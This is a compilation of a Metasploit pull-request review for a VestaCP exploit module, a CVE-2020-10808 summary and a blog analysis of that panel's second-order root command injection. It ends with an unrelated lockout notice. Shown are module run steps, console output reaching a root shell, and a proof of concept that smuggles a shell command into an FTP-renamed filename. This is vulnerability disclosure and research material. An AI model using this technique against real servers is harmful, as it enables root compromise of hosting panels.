Hi all,

It's been a while since I haven't release one of these.

PS: [#13093](https://github.com/rapid7/metasploit-framework/pull/13093) must be landed first.

## Verification

List the steps needed to make sure this thing works

* Start `msfconsole`
* `use exploit/linux/http/vestacp_exec`
* Set `RHOST`
* Set `LHOST`
* Set `USERNAME`
* Set `PASSWORD`
* Set `SRVHOST`
* Set `SRVPORT`
* Run `exploit`
* **Verify** that you are seeing `Successfully authenticated to the FTP service` in console.
* **Verify** that you are seeing `Successfully uploaded the payload as a file name` in console.
* **Verify** that you are seeing `Successfully authenticated to the HTTP Service` in console.
* **Verify** that you are seeing `Scheduled backup has ben started. Exploitation may take up to 5 minutes.` in console.
* **Verify** that you are seeing `It seems there is an active backup process ! Recheck after 30 second. Zzzzzz...` in console.
* **Verify** that you are seeing `First stage is executed ! Sending 2nd stage of the payload` in console.
* **Verify** that you are getting meterpreter session.

Command stagers should be able to operate even with these restrictions, were there any issues you noticed?

I haven't noticed specific issue but I choose meterpreter payload delivery via web because of following reasons:

* Meterpreter is lovely ❤️ I always go for it if it's possible.
* Raw cmd stagers contains lots of special chars , such as < > & " etc etc , which are usually cause a syntax errors during exploitation of these type of vulnerabilities. So I have to must black-listed almost all of them, which means final payload will always be `perl{IFS}-e{IFS}` template no matter what type of cmd stager is being used.
* Specially when you encode python meterpreter stager into the `perl{IFS}-e{IFS}` template, there is no way to keep it shorter then file name length. So that means even if I support multiple payload platform, I have to use web delivery when python payload selected, which brings more and more if-else states in the module. I'm not even mentioning about supporting linux elf binary stagers, which brings even moreeee if-elses to module and bash codes on the server. At some point, I told my self "Meeeh, that's getting complicated :D why don't we just focus python meterpreter"

Yeah, using a library is ideal, but if the vuln is specific enough on restrictions, it's probably best to do custom encoding instead of working around the library. Fewer regressions may be anticipated in this case.

That said, I would make my best effort to make the library work, and I would modify the library if possible, but that may be more regression-prone. I think what you've done is fine in this case, and the module will continue to work into the future.

Sorry, something went wrong.

| Hey @mmetince, we're going to take a look at this in a bit, but question for you: Has the vuln been disclosed to the vendor here? And if it hasn't been, it needs to be. If you don't want to do that, [@todb-r7](https://github.com/todb-r7) might be able to help out. |

There are a few areas in this that still need fixes which I have marked in the review. Rest of it looks like mostly just grammatical and spelling errors which I will fix after you've fixed up these issues.

Sorry, something went wrong.

| Also @mmetince tried your exploit using the install instructions at <http://vestacp.com/install/> on Ubuntu 18.03 LTS. Seems the exploit does work though, but had to run it twice and then got a root shell instantly; guess the listener was timing out or something cause first try wasn't reliable and I lost the shell.  ``` msf5 > use exploit/linux/http/vestacp_exec  msf5 exploit(linux/http/vestacp_exec) > set RHOST 172.16.139.129 RHOST => 172.16.139.129 msf5 exploit(linux/http/vestacp_exec) > set LHOST 172.16.139.1 LHOST => 172.16.139.1 msf5 exploit(linux/http/vestacp_exec) > set SRVHOST 172.16.139.1 SRVHOST => 172.16.139.1 msf5 exploit(linux/http/vestacp_exec) > set USERNAME tester USERNAME => tester msf5 exploit(linux/http/vestacp_exec) > set PASSWORD testing PASSWORD => testing msf5 exploit(linux/http/vestacp_exec) > show options  Module options (exploit/linux/http/vestacp_exec):     Name       Current Setting  Required  Description    ----       ---------------  --------  -----------    PASSWORD   testing          yes       The password to login with    Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS     172.16.139.129   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT      8083             yes       The target port (TCP)    SRVHOST    172.16.139.1     yes       The local host to listen on.

I'll also retest this again when all of the fixes have been applied to ensure that thing still work as expected. |

### **[mdisec](/mdisec)** commented [Apr 11, 2020](#issuecomment-612400169)

| [@gwillcox-r7](https://github.com/gwillcox-r7) Thank you very much for your comprehensive review ! 🤘🏻  `Seems the exploit does work though, but had to run it twice and then got a root shell instantly`  The reason why you've got the instant root shell on your second **run** is all about nature of the vulnerability.  One of the most important thing about this exploit module is that, we are injection our payload into the `cat /usr/local/vesta/data/users/[USERNAME]/backup.conf` file by using v-backup-user. That files contains all the information about backup of the user. When the backup is done, we are triggering the payload.  So the logic is like a follow.  1 - Put an empty file into the user home folder with a malicious file name. 2 - Trigger the backup, which will manipulate the backup.conf ! 3 - Visit the backup list URL, if you are seeing `An existing backup is already running.` that means backup is still in progress. We must wait until it's done. 4 - Visit the backup list URL again and agin. If the backup is done, that means we are not seeing `An existing backup is already running.`, which means we triggered the payload !  When you second run the module, it triggers another backup process. In that case, backup.conf file content already contains a payload from the first attempt ! On your first attempt to check status of the backup via backup list URL, you are triggering payload that is already placed on the first attempt :) |

@mmetince Looking a lot better, still some areas to fix up. Sorry for earlier deleted comment, I made a comment initially and then deleted it and moved it into this full review instead. Main issues were the lack of a `check` command at the moment and the fact that you didn't update the listings within the documentation. Rest of it is mostly edits for additional clarity in certain areas.

Let me know if you have any questions or concerns!

| Also @mmetince I didn't mention this before but given that this module alters a config file, I would like to ensure that there is additional documentation that reflects this.  Can we add the following in (ratings taken from [https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability](https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability%2C-Side-Effects%2C-and-Stability) )  ```       'Notes'          =>         {           'Stability'   => [ CRASH_SAFE, ],           'Reliability' => [ FIRST_ATTEMPT_FAIL, ],           'SideEffects' => [ IOC_IN_LOGS, CONFIG_CHANGES, ],         },  ```  The reason for me adding IOC\_IN\_LOGS is cause if I open up `/usr/local/vesta/log/backup.log` there are clear copies of the commands you are executing in the logs which could indicate potential compromise.  [Screen Shot 2020-04-11 at 4 43 44 PM](https://user-images.githubusercontent.com/63261883/79055568-a0125400-7c13-11ea-8478-b8e63f7e5fe1.png)  For a good reference of where these should be placed, see   [metasploit-framework/modules/exploits/unix/webapp/wp\_infinitewp\_auth\_bypass.rb](https://github.com/rapid7/metasploit-framework/blob/5698f6e51fa8227321d3afe4666fd5a9073ce793/modules/exploits/unix/webapp/wp_infinitewp_auth_bypass.rb#L49)  Line 49 in [5698f6e](/rapid7/metasploit-framework/commit/5698f6e51fa8227321d3afe4666fd5a9073ce793)   |  | 'Notes' => { | | --- | --- |      On a similar note I'd also be interested if there is any way your exploit could clean up after itself as right now it seems that once one runs the exploit, every subsequent backup attempt will try connect back to the attacker's machine. This might be great for persistence but if someone is in a pentest, this will be an absolute nightmare as most likely someone will have to go back through the log file and clean out their entires by hand, which could take a long time if the log file is particularly large. |

Looks good, will need to make some edits for grammar and spelling but rest should be fine. Will also need to do some additional testing just to make sure some of the new logic additions work. Should land this soon though!

# Vulnerability Details : [CVE-2020-10808](/cve/CVE-2020-10808/ "CVE-2020-10808 security vulnerability details")

 Public exploit exists!

Vesta Control Panel (VestaCP) through 0.9.8-26 allows Command Injection via the schedule/backup Backup Listing Endpoint. The attacker must be able to create a crafted filename on the server, as demonstrated by an FTP session that renames .bash\_logout to a .bash\_logout' substring followed by shell metacharacters.

# Vesta Control Panel Second Order Remote Code Execution 0day Step-by-Step Analysis

 [March 18, 2020March 18, 2020](https://pentest.blog/vesta-control-panel-second-order-remote-code-execution-0day-step-by-step-analysis/)  [Mehmet Ince](https://pentest.blog/author/mehmet-ince/)
[Advisories](https://pentest.blog/category/advisories/)

I believe that doing a security research is all about trying to understand high-level of architecture of the products and finding a creative attack vectors.

I hope this blog post will show some the readers how to start doing security research.

#### Installation

You can install that software Debian/Ubuntu or CentOS. I’ve installed it on Ubuntu 18.10 x64 by following 3 steps at <http://vestacp.com/install/>.

```
# Connect to your server as root via SSH
ssh [[email protected]](/cdn-cgi/l/email-protection)
# Download installation script
curl -O http://vestacp.com/pub/vst-install.sh
# Run it
bash vst-install.sh
```
#### Vuln 0x01 – Security Design of Bash Script Executions

During static analysis of the web application, I’ve seen lots of bash script execution behind the scene. Let me give your one example from login process.

```
// VESTA_CMD variable definition is as follow.
define('VESTA_CMD', '/usr/bin/sudo /usr/local/vesta/bin/');
// ... OMITTED CODE...
if (isset($_POST['user']) && isset($_POST['password'])) {
    if(isset($_SESSION['token']) && isset($_POST['token']) && $_POST['token'] == $_SESSION['token']) {
        $v_user = escapeshellarg($_POST['user']);
        $v_ip = escapeshellarg($_SERVER['REMOTE_ADDR']);

        // Get user's salt
        $output = '';
        exec (VESTA_CMD."v-get-user-salt ".$v_user." ".$v_ip." json" , $output, $return_var);
        $pam = json_decode(implode('', $output), true);
        // ... OMITTED CODE...
```

Of course, having a input validation on user parameter would be better even if it’s securely used in **exec()** call. In order to find a possible insecure usage of **exec()** function call, I’ve reviewed all the source code but couldn’t find any. In the meantime, you may thinking about sudo command at the beginning of the **VESTA\_CMD** variable. Yes, all the bash scripts will be executed by sudo binary through administrator interface (PHP).

Following screenshot show that PHP-FPM process is running with admin user privileges, which is capable executing sudo command and eventually executes bash scripts.

![](https://pentest.blog/wp-content/uploads/vestacp-1.png)

So that means, admin user must have a root privileges. Here is the content of the sudoers file. Bash scripts, executables shouldn’t be executed under the context of privileged accounts, especially with user controllable datas.

```
root@mincelocal:~# cat /etc/sudoers|grep admin
# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL
root@mincelocal:~#
```

As I said before, all **exec()** or similar function calls has been securely used in the code base. That means, we can NOT directly have command injection vulnerability. But what if we can find an insecure command within one of the bash script with a user controllable variable ?

#### Vuln 0x02 – Second Order RCE on Backup Process

While I was reviewing bash script of some of the functionalists, one thing caught my attention. When you send GET request to the https://url:8083/schedule/backup/ endpoint, it will executed following PHP codes.

```
include($_SERVER['DOCUMENT_ROOT']."/inc/main.php");

$v_username = escapeshellarg($user);
exec (VESTA_CMD."v-schedule-user-backup ".$v_username, $output, $return_var);
```

Let’s have a look at content of the **v-schedule-user-backup** bash script file.

```
#!/bin/bash

# Argument definition
user=$1

# Includes
source $VESTA/func/main.sh
source $VESTA/conf/vesta.conf

check_args '1' "$#" 'USER'
is_format_valid 'user'
is_system_enabled "$BACKUP_SYSTEM" 'BACKUP_SYSTEM'
is_object_valid 'user' 'USER' "$user"
is_backup_enabled
is_backup_scheduled 'backup'

# Adding backup task to  the queue
log=$VESTA/log/backup.log
echo "$BIN/v-backup-user $user yes >> $log 2>&1" >>\
    $VESTA/data/queue/backup.pipe

# Logging
log_event "$OK" "$ARGUMENTS"

exit

```

Nothing interesting so far. We can NOT even control **user** variable, since it’s coming from session. But **v-schedule-user-backup** is executing **v-backup-user** file. Let’s keep reading. That bash scripts does what it says, it gathers all the data related to our user and compress it as a tar.gz file.

That bash script has 945 line of code. For that reason, I’m only showing important parts.

Following code section is taken lines between 900-920 from **v-backup-user** file. It writes multiple variable into the backup.conf file (that’ll be very important later!)

```
# Registering new backup
backup_str="BACKUP='$user.$backup_new_date.tar'"
backup_str="$backup_str TYPE='$BACKUP_SYSTEM' SIZE='$size'"
backup_str="$backup_str WEB='${web_list// /,}'"
backup_str="$backup_str DNS='${dns_list// /,}'"
backup_str="$backup_str MAIL='${mail_list// /,}'"
backup_str="$backup_str DB='${db_list// /,}'"
backup_str="$backup_str CRON='$cron_list'"
backup_str="$backup_str UDIR='${udir_list// /,}'"
backup_str="$backup_str RUNTIME='$run_time' TIME='$time' DATE='$date'"
echo "$backup_str" >> $USER_DATA/backup.conf
```

One of the variable is 9. line **udir\_list** , which is being populated by following code section around line 400-450 in the code base.

```
    for udir in $(ls -a |egrep -v "^conf$|^web$|^dns$|^mail$|^\.\.$|^\.$"); do
        exclusion=$(echo "$USER" |tr ',' '\n' |grep "^$udir$")
        if [ -z "$exclusion" ]; then
            ((i ++))
            udir_list="$udir_list $udir"
            echo -e "$(date "+%F %T") adding $udir" |tee -a $BACKUP/$user.log

            # Backup files and dirs
            tar --anchored -cpf- ${fargs[@]} $udir |gzip -$BACKUP_GZIP - > $tmpdir/user_dir/$udir.tar.gz
        fi
    done
```

It basically works as follow in order:
–       Get speficis folder names and files start with dots.
–       Compress them into the backup file.
–       Replace spaces within the file and/or folder names in case of whitespace. (that’ll be important too)

In the end you will have your tar backup file on your user’s folder. Please keep that information in your mind, we’ll come back here later ! Now let’s see what’s happening when your list existing backup file via web panel.

**Listing Existing Backup**

Following URL can be used to list current backups. [https://URL:8083/list/backup/](https://192.168.74.218:8083/list/backup/)

```
    exec (VESTA_CMD."v-list-user-backup $user ".escapeshellarg($_GET['backup'])." json", $output, $return_var);
    $data = json_decode(implode('', $output), true);
    $data = array_reverse($data,true);
    unset($output);
```

That endpoint will execute **v-list-user-backups** bash script file with **user**, **backup** and **json** variables retrieves some information about user’s backup and shows them on web ui.

![](https://pentest.blog/wp-content/uploads/vestacp-2.png)

Let’s have a look at v-list-user-backup implementation. Please keep that in your mind, we are interested with json output.

```
json_list() {
    IFS=$'\n'
    i=1
    objects=$(grep BACKUP $USER_DATA/backup.conf |wc -l)
    echo "{"
    while read str; do
        eval $str
        echo -n '    "'$BACKUP'": {
        "TYPE": "'$TYPE'",
        "SIZE": "'$SIZE'",
        "WEB": "'$WEB'",
        "DNS": "'$DNS'",
        "MAIL": "'$MAIL'",
        "DB": "'$DB'",
        "CRON": "'$CRON'",
        "UDIR": "'$UDIR'",
        "RUNTIME": "'$RUNTIME'",
        "TIME": "'$TIME'",
        "DATE": "'$DATE'"
    }'
        if [ "$i" -lt "$objects" ]; then
            echo ','
        else
            echo
        fi
        ((i++))
    done < <(cat $USER_DATA/backup.conf)
    echo '}'
}
```

Allright, that’s interesting : ) Content of the user’s backup.conf file read and string is being passed to the eval J It’s time to remember first stage of that report, backup.conf is being created with multiple parameter (remember udir\_list)

```
root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf

BACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout,.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'

root@mincelocal:~#
```

Here is the content of the backup.conf file. All the files starts with dot is in the UDIR definiton with single quotes and thanks to best operating system ever Linux, we can use single quotes in the files name 🙂 We can connect our user’s homefolder with FTP and renamed .bash\_logout file with something **.bash\_logout’;$(PAYLOAD);’** will be our payload.

#### PoC

1 – User login to the FTP

2 – Renamed the .bash\_logout with **bash\_logout’;$(sleep${IFS}1337);’** ! white-space will break the payload. Remember sed command on the previouse section!

![](https://pentest.blog/wp-content/uploads/vestacp-3-1.png)

3 – User login to the web application.

4 – Trigger the backup process.

5 – When the backup process finished, wait like 3-4 minutes, Here is the content of the backup.conf with implanted payload.

```
root@mincelocal:~# cat /usr/local/vesta/data/users/user01/backup.conf

BACKUP='user01.2020-03-13_13-40-01.tar' TYPE='local' SIZE='1' WEB='' DNS='' MAIL='' DB='' CRON='' UDIR='.bash_logout';$(sleep${IFS}1337);',.bashrc,.profile,tmp' RUNTIME='1' TIME='13:40:01' DATE='2020-03-13'
```

6 – Go to <https://192.168.74.218:8083/list/backup/>endpoint where we trigger the v-list-user-backup bash script execution. v-list-user-backup will read the content of the backup.conf file which contains our payload in the filename changed via FTP on step 2.

7 – eval is being called.

8 – Thanks to the first vulnerability, that command will be executed as a root !

![](https://pentest.blog/wp-content/uploads/vestacp-4.png)
### Exploitation

Ofcourse executing a sleep command with root privileges is not enough ! Here is the Metasploit module in action fellers !

One of the major problem about exploitation is that we have length limitation on file name 🙂 Also space within the file name is forbidden because it breaks bash script eval command. So you may want to read Metasploit module’s source code in order to see how I managed to overcome these problems.

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
